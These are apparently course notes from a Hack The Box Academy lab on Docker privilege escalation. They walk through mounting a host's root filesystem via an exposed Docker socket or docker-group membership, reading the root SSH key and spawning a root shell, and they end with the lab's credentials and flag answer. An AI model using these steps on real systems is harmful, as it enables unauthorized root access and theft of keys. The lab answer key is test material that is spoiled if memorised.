# Docker
## Docker Architecture
Client-server model:
- The Docker daemon
- The Docker client

The Docker client acts as our interface for issuing commands and interacting with the Docker ecosystem, while the Docker daemon is responsible for executing those commands and managing containers.

## Docker Privilege Escalation
### Docker Sockets
A Docker socket or Docker daemon socket is a special file that allows us and processes to communicate with the Docker daemon.

Nevertheless, Docker sockets require appropriate permissions to ensure secure communication and prevent unauthorized access. Access to the Docker socket is typically restricted to specific users or user groups, ensuring that only trusted individuals can issue commands and interact with the Docker daemon. By exposing the Docker socket over a network interface, we can remotely manage Docker hosts, issue commands, and control containers and other resources.

```shellsession
$ ls -al

total 8
drwxr-xr-x 1 htb-student htb-student 4096 Jun 30 15:12 .
drwxr-xr-x 1 root        root        4096 Jun 30 15:12 ..
srw-rw---- 1 root        root           0 Jun 30 15:27 docker.sock
```

From here on, we can use the `docker` binary to interact with the socket and enumerate what docker containers are already running. If not installed, then we can download it [here](https://master.dockerproject.com/linux/x86_64/docker) and upload it to the Docker container.

```shellsession
$ wget https://<parrot-os>:443/docker -O docker
$ chmod +x docker
$ ls -l

-rwxr-xr-x 1 htb-student htb-student 0 Jun 30 15:27 docker


$ /tmp/docker -H unix:///app/docker.sock ps

CONTAINER ID     IMAGE         COMMAND                 CREATED       STATUS           PORTS     NAMES
3fe8a4782311     main_app      "/docker-entry.s..."    3 days ago    Up 12 minutes    443/tcp   app
<SNIP>
```

We can create our own Docker container that maps the host’s root directory (`/`) to the `/hostsystem` directory on the container. With this, we will get full access to the host system. 

```shellsession
$ /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
$ /tmp/docker -H unix:///app/docker.sock ps

CONTAINER ID     IMAGE         COMMAND                 CREATED           STATUS           PORTS     NAMES
7ae3bcc818af     main_app      "/docker-entry.s..."    12 seconds ago    Up 8 seconds     443/tcp   app
3fe8a4782311     main_app      "/docker-entry.s..."    3 days ago        Up 17 minutes    443/tcp   app
<SNIP>
$ /tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash


root@7ae3bcc818af:~# cat /hostsystem/root/.ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
<SNIP>
```

A case that can also occur is when the Docker socket is writable. Usually, this socket is located in `/var/run/docker.sock`. However, the location can understandably be different. Because basically, this can only be written by the `root` or `docker` group. If we act as a user, not in one of these two groups, and the Docker socket still has the privileges to be writable, then we can still use this case to escalate our privileges.

```shellsession
$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash

root@ubuntu:~# ls -l
```

### Docker Group
To gain root privileges through Docker, the user we are logged in with must be in the `docker` group. This allows him to use and control the Docker daemon.

```shellsession
$ id

uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)
```

## Questions
SSH to 10.129.205.237 (ACADEMY-LLPE-DOCKER), with user `htb-student` and password `HTB_@cademy_stdnt!`
1. Escalate the privileges on the target and obtain the flag.txt in the root directory. Submit the contents as the answer. **Answer: HTB{D0ck3r_Pr1vE5c}**
   - Run a Ubuntu docker container with the host's file system mounted in /mnt in the container and spawn an interactive shell:
        ```shellsession
        $ id
        uid=1001(htb-student) gid=1001(htb-student) groups=1001(htb-student),118(docker)
        $ docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
        root@d9b223c4bcbf:/# cat root/flag.txt
        HTB{D0ck3r_Pr1vE5c}
        ```